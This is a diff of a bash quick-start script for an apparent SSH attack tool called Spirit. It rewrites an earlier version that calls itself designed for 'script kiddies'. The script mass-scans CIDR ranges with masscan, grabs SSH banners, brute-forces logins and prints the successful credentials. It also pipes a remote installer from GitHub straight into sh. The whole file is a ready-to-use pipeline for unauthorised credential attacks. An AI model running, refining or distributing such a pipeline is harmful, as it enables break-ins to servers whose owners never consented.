@@ -1,69 +1,240 @@
-#!/bin/bash
-set -e
+#!/usr/bin/env bash
+#
+# Spirit Quick Start
+# Simple, professional wrapper for zone-based masscan + banner + brute pipeline.
+#
+# Usage:
+#   ./go.sh --zone zone.lst --ports 22,23,2222 [--rate 30000]
+#
+# The script will:
+#   - Auto-install ./spirit (via official installer) if missing
+#   - Ensure masscan is available (installs via apt/dnf/yum/pacman/apk when possible)
+#   - Backup previous artifacts into ./bak/
+#   - Run the full pipeline using spirit subcommands
+#
+# Requires root (or raw socket capability) for masscan.
+#
 
-# Designed for unskilled script kiddies and the sort...
+set -euo pipefail
 
-if [ $# != 3 ]; then
-    echo -e "[-] \e[31mUsage example: $0 <class-A> <port1,port2,port3> <speed> \e[0m"
-    exit
-fi
-clear
-
-if command -v apt-get &> /dev/null; then
-    echo "Installing dependencies using apt..."
-    DEBIAN_FRONTEND=noninteractive apt-get install -yqq \
-		masscan
-    	INSTALLER=(apt-get install -yqq)
-elif command -v yum &> /dev/null; then # Redhat-based OS (Fedora, CentOS, RHEL)
-    echo "Installing dependencies using yum..."
-    yum -y install masscan
-	INSTALLER=(yum -y)
-elif command -v pacman &>/dev/null; then # Arch-based (Manjaro, Garuda, Blackarch)
-	echo "Installing dependencies using pacman..."
-	pacman --noconfirm -S masscan
-    INSTALLER=(pacman --noconfirm -S)
+# -----------------------------------------------------------------------------
+# Colors (only when stdout is a tty)
+# -----------------------------------------------------------------------------
+if [ -t 1 ]; then
+  RED=$'\033[31m'
+  GREEN=$'\033[32m'
+  YELLOW=$'\033[33m'
+  BOLD=$'\033[1m'
+  NC=$'\033[0m'
 else
-    echo "Unsupported OS, exiting"
-    exit
+  RED='' GREEN='' YELLOW='' BOLD='' NC=''
 fi
 
-# Verify if necessary tools are installed
-for cmd in curl tar masscan; do
-    if ! command -v "$cmd" &> /dev/null; then		
-        echo "$cmd could not be found, installing..."
-		"${INSTALLER[@]}" "$cmd"
-    fi
+die() {
+  printf '%s\n' "${RED}${BOLD}ERROR:${NC} $*" >&2
+  exit 1
+}
+
+info() {
+  printf '%s\n' "${GREEN}${BOLD}==>${NC} $*"
+}
+
+warn() {
+  printf '%s\n' "${YELLOW}${BOLD}WARN:${NC} $*"
+}
+
+have_cmd() {
+  command -v "$1" >/dev/null 2>&1
+}
+
+usage() {
+  cat <<'EOF'
+Usage: ./go.sh --zone FILE --ports LIST [--rate N]
+
+Required:
+  -z, --zone FILE      Zone file containing CIDR ranges (one per line)
+  -p, --ports LIST     Comma-separated list of ports (e.g. 22,23,2222)
+
+Optional:
+  -r, --rate N         Packets per second for masscan (default: 30000)
+
+Examples:
+  ./go.sh -z zone.lst -p 22,23,2222
+  ./go.sh --zone zone.lst --ports 22 --rate 100000
+EOF
+  exit 2
+}
+
+# -----------------------------------------------------------------------------
+# Argument parsing (fail fast)
+# -----------------------------------------------------------------------------
+ZONE=""
+PORTS=""
+RATE=30000
+
+while [[ $# -gt 0 ]]; do
+  case "$1" in
+    -z|--zone)
+      [[ $# -ge 2 ]] || die "--zone requires a value"
+      ZONE="$2"
+      shift 2
+      ;;
+    -p|--ports)
+      [[ $# -ge 2 ]] || die "--ports requires a value"
+      PORTS="$2"
+      shift 2
+      ;;
+    -r|--rate)
+      [[ $# -ge 2 ]] || die "--rate requires a value"
+      RATE="$2"
+      shift 2
+      ;;
+    -h|--help)
+      usage
+      ;;
+    *)
+      die "Unknown argument: $1 (use --help for usage)"
+      ;;
+  esac
 done
 
-cp "$(which masscan)" .
+[[ -n "$ZONE" ]] || usage
+[[ -n "$PORTS" ]] || usage
+[[ -f "$ZONE" ]] || die "Zone file not found: $ZONE"
+[[ "$RATE" =~ ^[0-9]+$ && "$RATE" -gt 0 ]] || die "Rate must be a positive integer"
 
-echo -e "[+] increasing system limits"
-ulimit -n 65535
+# -----------------------------------------------------------------------------
+# Privilege helper
+# -----------------------------------------------------------------------------
+SUDO=""
+if [[ $EUID -ne 0 ]]; then
+  SUDO="sudo"
+fi
 
-echo -e "[+] starting masscan on network [$1.0.0.0/8] port [$2] with speed [$3]"
-sudo ./masscan \
---range "$1".0.0.0-"$1".255.255.255 \
---ports "$2" \
---max-rate "$3" \
---exclude 255.255.255.255 \
---exclude 10.0.0.0/8 \
---exclude 192.168.0.0/16 \
---exclude 127.0.0.0/8 \
---interactive \
--oG open.lst
+# -----------------------------------------------------------------------------
+# Ensure Spirit binary (downloads via official installer if missing)
+# -----------------------------------------------------------------------------
+ensure_spirit() {
+  if [[ -x ./spirit ]]; then
+    return 0
+  fi
 
-HOSTS=$(wc -l < open.lst) &>/dev/null
-echo -e "[+] masscan found [$HOSTS] hosts on port/s [$2]"
+  info "Spirit binary not found in current directory — downloading..."
+  curl -fsSL https://raw.githubusercontent.com/theaog/spirit/master/script/install.sh | sh
 
-echo -e "[+] parsing masscan output"
-./spirit parse
+  if [[ ! -x ./spirit ]]; then
+    die "Failed to install ./spirit. Please run the installer manually or check your network."
+  fi
 
-echo -e "[+] starting banner grabber"
-./spirit banner
+  info "Spirit installed successfully."
+}
 
-echo -e "[+] starting brute-force attack"
-./spirit brute
+# -----------------------------------------------------------------------------
+# Ensure masscan is available (install via supported package managers)
+# -----------------------------------------------------------------------------
+detect_pkg_manager() {
+  if have_cmd apt-get; then
+    INSTALL_CMD="DEBIAN_FRONTEND=noninteractive apt-get install -yqq"
+  elif have_cmd dnf; then
+    INSTALL_CMD="dnf install -y"
+  elif have_cmd yum; then
+    INSTALL_CMD="yum install -y"
+  elif have_cmd pacman; then
+    INSTALL_CMD="pacman --noconfirm -S"
+  elif have_cmd apk; then
+    INSTALL_CMD="apk add --no-cache"
+  else
+    INSTALL_CMD=""
+  fi
+}
 
-echo -e "[+] done, let's see what we've found:"
-sleep 3
-head -n20 found.ssh 2>/dev/null || echo "no servers found :("
+ensure_masscan() {
+  if have_cmd masscan; then
+    return 0
+  fi
+
+  detect_pkg_manager
+
+  if [[ -z "$INSTALL_CMD" ]]; then
+    die "masscan is not installed and no supported package manager was detected.
+Please install masscan manually (apt/dnf/yum/pacman/apk) and re-run."
+  fi
+
+  info "masscan not found — installing via package manager..."
+  # shellcheck disable=SC2086
+  $SUDO $INSTALL_CMD masscan || die "Failed to install masscan. Try running as root or install it manually."
+  info "masscan installed."
+}
+
+# -----------------------------------------------------------------------------
+# Backup previous run artifacts into ./bak/
+# -----------------------------------------------------------------------------
+backup_artifacts() {
+  local ts
+  ts=$(date +%Y%m%d-%H%M%S)
+
+  mkdir -p bak
+
+  local files=(
+    open.lst
+    h.lst
+    b.lst
+    found.ssh
+    found.login
+    found.lst
+    found.errors
+    found.nologin
+  )
+
+  local f backed_up=0
+  for f in "${files[@]}"; do
+    if [[ -f "$f" ]]; then
+      mv "$f" "bak/${f}-${ts}" 2>/dev/null || true
+      backed_up=1
+    fi
+  done
+
+  if [[ $backed_up -eq 1 ]]; then
+    info "Previous artifacts backed up to bak/ (timestamp: $ts)"
+  fi
+}
+
+# -----------------------------------------------------------------------------
+# Run the full pipeline
+# -----------------------------------------------------------------------------
+run_pipeline() {
+  info "Starting masscan (zone: $ZONE, ports: $PORTS, rate: $RATE)"
+  ./spirit masscan --zone "$ZONE" --ports "$PORTS" --rate "$RATE"
+
+  info "Parsing masscan output..."
+  ./spirit parse
+
+  info "Grabbing SSH banners..."
+  ./spirit banner
+
+  info "Starting brute-force..."
+  ./spirit brute
+
+  info "Pipeline finished."
+
+  if [[ -f found.ssh ]]; then
+    printf '\n%s\n' "${BOLD}Top findings (found.ssh):${NC}"
+    head -n 20 found.ssh || true
+    printf '\n%s\n' "Full results are in: found.ssh, found.login, found.lst"
+  else
+    echo "No successful logins recorded."
+  fi
+}
+
+# -----------------------------------------------------------------------------
+# Main
+# -----------------------------------------------------------------------------
+main() {
+  info "Spirit Quick Start — zone scan + banner + brute"
+  ensure_spirit
+  ensure_masscan
+  backup_artifacts
+  run_pipeline
+}
+
+main "$@"
